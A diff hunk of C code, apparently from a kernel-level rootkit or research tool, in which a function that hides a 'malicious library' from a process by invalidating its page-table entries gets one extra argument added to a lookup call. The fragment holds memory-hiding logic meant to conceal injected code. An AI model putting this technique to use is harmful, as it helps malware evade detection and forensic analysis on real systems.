@@ -49,7 +49,7 @@ void pte_vma_delete_handler(char *mal_lib_path, int mode, int pid) {
     if (mode == HIDE) {
         int status = -1;
         for (int i = 0; i < sizeof(vma_rights_pv) / sizeof(int); i++) {
-            struct vm_area_struct *mal_vma = find_vma_path_rights(mal_lib_path, vma_rights_pv[i], pid);
+            struct vm_area_struct *mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_pv[i], pid);
             if (mal_vma) {
                 /* Invalidate the PTEs */
                 if(vma_rights_pv[i]) {
